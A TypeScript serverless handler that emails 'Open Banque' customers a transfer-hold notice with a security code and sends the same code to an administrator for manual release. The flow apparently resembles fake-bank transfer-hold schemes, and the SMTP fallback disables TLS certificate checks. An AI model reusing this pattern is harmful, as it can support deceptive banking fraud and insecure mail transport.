import type { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from 'nodemailer';

// Helper function to escape HTML to prevent XSS
function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return (text || '').replace(/[&<>"']/g, (m) => map[m]);
}

// Helper to send email via Resend API or Nodemailer
async function sendEmail({
  from,
  to,
  subject,
  html,
  text
}: {
  from: string;
  to: string | string[];
  subject: string;
  html: string;
  text: string;
}) {
  const resendApiKey = process.env.RESEND_API_KEY;

  if (resendApiKey) {
    console.log('🚀 Sending via Resend API to:', to);
    const toArray = Array.isArray(to) ? to : [to];
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${resendApiKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from,
        to: toArray,
        subject,
        html,
        text
      })
    });

    const data = await res.json();
    if (!res.ok) {
      console.error('❌ Resend API error:', data);
      throw new Error(data.message || 'Resend API failed');
    }
    console.log('✅ Sent via Resend:', data.id);
    return { messageId: data.id };
  }

  // Fallback to Nodemailer SMTP
  const smtpUser = process.env.SMTP_USER;
  const smtpPassword = process.env.SMTP_PASSWORD;
  if (!smtpUser || !smtpPassword) {
    throw new Error('No email provider configured. Please set RESEND_API_KEY or SMTP credentials.');
  }

  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtp.zoho.com',
    port: parseInt(process.env.SMTP_PORT || '587'),
    secure: process.env.SMTP_SECURE === 'true',
    auth: { user: smtpUser, pass: smtpPassword },
    tls: { rejectUnauthorized: false }
  });

  return await transporter.sendMail({
    from,
    to: Array.isArray(to) ? to.join(', ') : to,
    subject,
    html,
    text
  });
}

// Translations for transaction validation email
const VALIDATION_EMAIL_TRANSLATIONS: Record<string, Record<string, string>> = {
  fr: {
    subject: 'Code de validation requis pour votre transfert - Open Banque',
    greeting: 'Bonjour',
    title: 'Vérification de Sécurité Requise',
    message1: 'Votre transfert nécessite une validation de sécurité.',
    message2: 'Pour votre protection, un protocole de sécurité a suspendu temporairement le virement.',
    message3: 'Veuillez saisir le code de validation sécurisé ci-dessous dans votre tableau de bord Open Banque pour libérer les fonds et finaliser le virement.',
    progress: 'Progression du transfert',
    amount: 'Montant',
    recipient: 'Bénéficiaire',
    codeLabel: 'Votre code de sécurité temporaire',
    instructions: 'Instructions de validation',
    instruction1: '1. Rendez-vous sur votre tableau de bord Open Banque',
    instruction2: '2. Reprenez la fenêtre de suivi de votre virement',
    instruction3: '3. Saisissez votre code de sécurité unique à 6 chiffres',
    instruction4: '4. Cliquez sur "VALIDER" pour débloquer les fonds',
    footer: 'Cordialement,',
    footerTeam: 'L\'équipe Sécurité Open Banque',
    footerNote: 'Cet email a été envoyé automatiquement pour la protection de vos avoirs. Ne partagez ce code avec aucun tiers non autorisé.',
    footerSecurity: 'Pour votre sécurité, ce code est à usage unique.'
  },
  en: {
    subject: 'Validation code required for your transfer - Open Banque',
    greeting: 'Hello',
    title: 'Security Verification Required',
    message1: 'Your transfer requires security verification.',
    message2: 'For your protection, a security protocol has temporarily paused the transfer.',
    message3: 'Please enter the secure validation code below in your Open Banque dashboard to release the funds and complete the transfer.',
    progress: 'Transfer progress',
    amount: 'Amount',
    recipient: 'Recipient',
    codeLabel: 'Your temporary security code',
    instructions: 'Validation Instructions',
    instruction1: '1. Go to your Open Banque dashboard',
    instruction2: '2. Open your transfer monitoring window',
    instruction3: '3. Enter your unique 6-digit security code',
    instruction4: '4. Click "VALIDATE" to release the funds',
    footer: 'Best regards,',
    footerTeam: 'The Open Banque Security Team',
    footerNote: 'This email was sent automatically for your protection. Never share this code with anyone.',
    footerSecurity: 'For your security, this code is single-use.'
  },
  nl: {
    subject: 'Validatiecode vereist voor uw overboeking - Open Banque',
    greeting: 'Hallo',
    title: 'Beveiligingsverificatie Vereist',
    message1: 'Uw overboeking vereist een beveiligingsverificatie.',
    message2: 'Voor uw veiligheid heeft een beveiligingsprotocol de overboeking tijdelijk onderbroken.',
    message3: 'Voer de onderstaande beveiligingscode in op uw Open Banque-dashboard om de fondsen vrij te geven en de overboeking te voltooien.',
    progress: 'Voortgang overboeking',
    amount: 'Bedrag',
    recipient: 'Begunstigde',
    codeLabel: 'Uw tijdelijke beveiligingscode',
    instructions: 'Validatie-instructies',
    instruction1: '1. Ga naar uw Open Banque-dashboard',
    instruction2: '2. Open het overboekingsvenster',
    instruction3: '3. Voer uw unieke 6-cijferige beveiligingscode in',
    instruction4: '4. Klik op "VALIDEER" om de fondsen vrij te geven',
    footer: 'Met vriendelijke groet,',
    footerTeam: 'Het Open Banque Beveiligingsteam',
    footerNote: 'Deze e-mail is automatisch verzonden voor uw veiligheid.',
    footerSecurity: 'Deze code is voor eenmalig gebruik.'
  },
  de: {
    subject: 'Validierungscode für Ihre Überweisung erforderlich - Open Banque',
    greeting: 'Hallo',
    title: 'Sicherheitsüberprüfung Erforderlich',
    message1: 'Ihre Überweisung erfordert eine Sicherheitsüberprüfung.',
    message2: 'Zu Ihrem Schutz wurde die Überweisung vorübergehend angehalten.',
    message3: 'Bitte geben Sie den unten stehenden Sicherheitscode in Ihrem Open Banque Dashboard ein, um die Gelder freizugeben.',
    progress: 'Überweisungsfortschritt',
    amount: 'Betrag',
    recipient: 'Empfänger',
    codeLabel: 'Ihr temporärer Sicherheitscode',
    instructions: 'Validierungsanweisungen',
    instruction1: '1. Öffnen Sie Ihr Open Banque Dashboard',
    instruction2: '2. Rufen Sie das Überweisungsfenster auf',
    instruction3: '3. Geben Sie Ihren 6-stelligen Sicherheitscode ein',
    instruction4: '4. Klicken Sie auf "BESTÄTIGEN"',
    footer: 'Mit freundlichen Grüßen,',
    footerTeam: 'Ihr Open Banque Sicherheitsteam',
    footerNote: 'Diese E-Mail wurde automatisch generiert.',
    footerSecurity: 'Dieser Code ist nur einmalig gültig.'
  },
  es: {
    subject: 'Código de validación requerido para su transferencia - Open Banque',
    greeting: 'Hola',
    title: 'Verificación de Seguridad Requerida',
    message1: 'Su transferencia requiere verificación de seguridad.',
    message2: 'Para su protección, un protocolo de seguridad ha pausado temporalmente la operación.',
    message3: 'Por favor, ingrese el código de seguridad a continuación en su panel de Open Banque para liberar los fondos.',
    progress: 'Progreso de la transferencia',
    amount: 'Monto',
    recipient: 'Destinatario',
    codeLabel: 'Su código de seguridad temporal',
    instructions: 'Instrucciones de validación',
    instruction1: '1. Vaya a su panel de control Open Banque',
    instruction2: '2. Abra la ventana de seguimiento de la transferencia',
    instruction3: '3. Ingrese su código de seguridad de 6 dígitos',
    instruction4: '4. Haga clic en "VALIDAR"',
    footer: 'Atentamente,',
    footerTeam: 'El equipo de Seguridad Open Banque',
    footerNote: 'Este correo ha sido enviado automáticamente para su seguridad.',
    footerSecurity: 'Este código es de uso único.'
  }
};

export default async function handler(
  req: VercelRequest,
  res: VercelResponse,
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { name, email, language = 'fr', code, amount, recipientName, progress } = req.body;

    if (!name || !email || !code) {
      return res.status(400).json({ 
        error: 'Missing required fields',
        required: ['name', 'email', 'code']
      });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ error: 'Invalid email format' });
    }

    const lang = (language as string) || 'fr';
    const t = VALIDATION_EMAIL_TRANSLATIONS[lang] || VALIDATION_EMAIL_TRANSLATIONS['fr'];

    const fromEmail = process.env.FROM_EMAIL || 'Open Banque <contact@openbanque.company>';
    const adminAlertEmail = process.env.ADMIN_ALERT_EMAIL || 'contact@openbanque.company';

    const safeName = escapeHtml(name);
    const safeEmail = escapeHtml(email);
    const safeCode = escapeHtml(code);
    const safeAmount = amount ? escapeHtml(amount.toString()) : '';
    const safeRecipient = recipientName ? escapeHtml(recipientName) : '';
    const safeProgress = progress ? escapeHtml(progress.toString()) : '';

    // ==========================================
    // 1. EMAIL POUR LE CLIENT
    // ==========================================
    const clientHtml = `
      <!DOCTYPE html>
      <html lang="${lang}">
      <head>
        <meta charset="UTF-8">
        <title>${t.subject}</title>
      </head>
      <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0f172a; color: #f8fafc;">
        <table role="presentation" style="width: 100%; border-collapse: collapse; padding: 30px 15px;">
          <tr>
            <td align="center">
              <table role="presentation" style="max-width: 600px; width: 100%; background-color: #1e293b; border: 1px solid #334155; border-radius: 16px; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);">
                <!-- Header with Brand Logo -->
                <tr>
                  <td style="background: linear-gradient(135deg, #059669 0%, #0d9488 100%); padding: 35px 30px; text-align: center;">
                    <div style="font-size: 26px; font-weight: 800; color: #ffffff; letter-spacing: 0.5px;">
                      OPEN BANQUE
                    </div>
                    <div style="font-size: 13px; color: #a7f3d0; margin-top: 4px; text-transform: uppercase; letter-spacing: 1.5px;">
                      Banque Numérique & Sécurisée
                    </div>
                  </td>
                </tr>

                <!-- Content -->
                <tr>
                  <td style="padding: 35px 30px;">
                    <div style="display: inline-block; background-color: rgba(245, 158, 11, 0.15); border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 9999px; padding: 6px 16px; margin-bottom: 20px;">
                      <span style="color: #fbbf24; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">
                        ⚠️ ${t.title}
                      </span>
                    </div>

                    <h2 style="margin: 0 0 16px 0; color: #ffffff; font-size: 20px; font-weight: 700;">
                      ${t.greeting} ${safeName},
                    </h2>

                    <p style="margin: 0 0 20px 0; color: #cbd5e1; font-size: 15px; line-height: 1.6;">
                      ${t.message1} ${t.message2}
                    </p>

                    <!-- Transaction details card -->
                    <table role="presentation" style="width: 100%; background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin-bottom: 25px; border-collapse: collapse;">
                      <tr>
                        <td style="padding: 14px 18px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">${t.amount}</td>
                        <td style="padding: 14px 18px; border-bottom: 1px solid #1e293b; color: #34d399; font-size: 16px; font-weight: 700; text-align: right;">${safeAmount} €</td>
                      </tr>
                      <tr>
                        <td style="padding: 14px 18px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">${t.recipient}</td>
                        <td style="padding: 14px 18px; border-bottom: 1px solid #1e293b; color: #ffffff; font-size: 14px; font-weight: 600; text-align: right;">${safeRecipient}</td>
                      </tr>
                      <tr>
                        <td style="padding: 14px 18px; color: #94a3b8; font-size: 13px;">${t.progress}</td>
                        <td style="padding: 14px 18px; color: #38bdf8; font-size: 14px; font-weight: 700; text-align: right;">${safeProgress}% (Arrêt de contrôle)</td>
                      </tr>
                    </table>

                    <!-- Security Code Highlight Box -->
                    <div style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.15) 0%, rgba(6, 182, 212, 0.15) 100%); border: 2px dashed #10b981; border-radius: 12px; padding: 25px; text-align: center; margin-bottom: 25px;">
                      <div style="color: #94a3b8; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px;">
                        ${t.codeLabel}
                      </div>
                      <div style="font-family: 'Courier New', monospace; font-size: 32px; font-weight: 800; color: #34d399; letter-spacing: 6px;">
                        ${safeCode}
                      </div>
                    </div>

                    <p style="margin: 0 0 20px 0; color: #cbd5e1; font-size: 14px; line-height: 1.6;">
                      ${t.message3}
                    </p>

                    <!-- Instructions -->
                    <div style="background-color: #0f172a; border-left: 3px solid #10b981; border-radius: 0 8px 8px 0; padding: 16px 20px; margin-bottom: 25px;">
                      <div style="color: #ffffff; font-weight: 700; font-size: 13px; margin-bottom: 8px;">${t.instructions}</div>
                      <div style="color: #94a3b8; font-size: 13px; line-height: 1.6;">
                        ${t.instruction1}<br>
                        ${t.instruction2}<br>
                        ${t.instruction3}<br>
                        ${t.instruction4}
                      </div>
                    </div>

                    <p style="margin: 0; color: #64748b; font-size: 13px;">
                      ${t.footer}<br>
                      <strong style="color: #94a3b8;">${t.footerTeam}</strong>
                    </p>
                  </td>
                </tr>

                <!-- Footer -->
                <tr>
                  <td style="background-color: #0f172a; border-top: 1px solid #334155; padding: 20px 30px; text-align: center; color: #64748b; font-size: 11px; line-height: 1.5;">
                    <p style="margin: 0 0 6px 0;">${t.footerNote}</p>
                    <p style="margin: 0;">© ${new Date().getFullYear()} Open Banque Corporation • <a href="https://openbanque.company" style="color: #10b981; text-decoration: none;">openbanque.company</a></p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      </body>
      </html>
    `;

    // ==========================================
    // 2. EMAIL D'ALERTE POUR L'ADMINISTRATEUR
    // ==========================================
    const adminSubject = `🚨 [ALERTE SÉCURITÉ] Arrêt transfert à ${safeProgress}% • ${safeName} (${safeAmount} €) • Code: ${safeCode}`;
    const adminHtml = `
      <!DOCTYPE html>
      <html>
      <head><meta charset="UTF-8"><title>${adminSubject}</title></head>
      <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0b1329; color: #f8fafc;">
        <table role="presentation" style="width: 100%; border-collapse: collapse; padding: 30px 15px;">
          <tr>
            <td align="center">
              <table role="presentation" style="max-width: 600px; width: 100%; background-color: #1e293b; border: 2px solid #ef4444; border-radius: 16px; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.6);">
                <tr>
                  <td style="background: linear-gradient(135deg, #b91c1c 0%, #dc2626 100%); padding: 30px; text-align: center;">
                    <div style="font-size: 24px; font-weight: 800; color: #ffffff;">
                      🔒 ALERTE ADMINISTRATEUR OPEN BANQUE
                    </div>
                    <div style="font-size: 13px; color: #fecaca; margin-top: 4px; text-transform: uppercase; letter-spacing: 1px;">
                      Interception de transaction • Code de sécurité requis
                    </div>
                  </td>
                </tr>

                <tr>
                  <td style="padding: 30px;">
                    <p style="color: #e2e8f0; font-size: 15px; margin-top: 0;">
                      Une transaction en cours a été <strong>suspendue au palier de contrôle de ${safeProgress}%</strong>. L'utilisateur attend la confirmation du code de validation.
                    </p>

                    <!-- Details Table -->
                    <table role="presentation" style="width: 100%; background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; border-collapse: collapse;">
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Nom du client</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #ffffff; font-weight: 700; text-align: right;">${safeName}</td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Email client</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #38bdf8; text-align: right;"><a href="mailto:${safeEmail}" style="color: #38bdf8; text-decoration: none;">${safeEmail}</a></td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Montant du transfert</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #34d399; font-weight: 800; font-size: 16px; text-align: right;">${safeAmount} €</td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Bénéficiaire</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #ffffff; text-align: right;">${safeRecipient}</td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Étape de blocage</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #fbbf24; font-weight: 700; text-align: right;">${safeProgress}%</td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; color: #94a3b8; font-size: 13px;">Date & Heure</td>
                        <td style="padding: 12px 16px; color: #94a3b8; text-align: right;">${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}</td>
                      </tr>
                    </table>

                    <!-- Validation Code Box -->
                    <div style="background-color: #0f172a; border: 2px solid #34d399; border-radius: 12px; padding: 20px; text-align: center; margin: 25px 0;">
                      <div style="color: #94a3b8; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px;">
                        CODE DE VALIDATION ATTENDU
                      </div>
                      <div style="font-family: 'Courier New', monospace; font-size: 36px; font-weight: 900; color: #34d399; letter-spacing: 8px;">
                        ${safeCode}
                      </div>
                      <div style="color: #64748b; font-size: 12px; margin-top: 8px;">
                        À transmettre au client si vous validez manuellement l'opération.
                      </div>
                    </div>

                    <div style="background-color: rgba(56, 189, 248, 0.1); border-left: 3px solid #38bdf8; padding: 12px 16px; border-radius: 0 8px 8px 0; color: #cbd5e1; font-size: 13px;">
                      💡 <em>Vous pouvez également suivre et débloquer ce transfert directement depuis le panneau d'administration Open Banque.</em>
                    </div>
                  </td>
                </tr>

                <tr>
                  <td style="background-color: #0f172a; padding: 15px 30px; text-align: center; color: #64748b; font-size: 11px;">
                    Notification générée automatiquement par le système de sécurité Open Banque.
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      </body>
      </html>
    `;

    // Envoyer l'email au client
    console.log('📤 Envoi de l\'email au client:', email);
    const clientSend = await sendEmail({
      from: fromEmail,
      to: email,
      subject: t.subject,
      html: clientHtml,
      text: `${t.greeting} ${safeName},\n\n${t.message1}\nMontant: ${safeAmount} €\nBénéficiaire: ${safeRecipient}\nCode de sécurité: ${safeCode}\nProgression: ${safeProgress}%`
    });

    // Envoyer l'email d'alerte à l'administrateur
    console.log('🚨 Envoi de l\'alerte à l\'administrateur:', adminAlertEmail);
    let adminSend = null;
    try {
      adminSend = await sendEmail({
        from: fromEmail,
        to: adminAlertEmail,
        subject: adminSubject,
        html: adminHtml,
        text: `ALERTE SÉCURITÉ OPEN BANQUE\n\nClient: ${safeName} (${safeEmail})\nMontant: ${safeAmount} €\nBénéficiaire: ${safeRecipient}\nProgression: ${safeProgress}%\n\nCODE ATTENDU: ${safeCode}`
      });
    } catch (err: any) {
      console.error('⚠️ Erreur lors de l\'envoi à l\'admin (non bloquant pour le client):', err.message);
    }

    return res.status(200).json({
      success: true,
      clientMessageId: clientSend.messageId,
      adminMessageId: adminSend?.messageId || null,
      message: 'Emails envoyés avec succès au client et à l\'administrateur'
    });

  } catch (error: any) {
    console.error('❌ Erreur lors du traitement de l\'email:', error);
    return res.status(500).json({
      success: false,
      error: 'Failed to send validation email',
      details: error.message
    });
  }
}
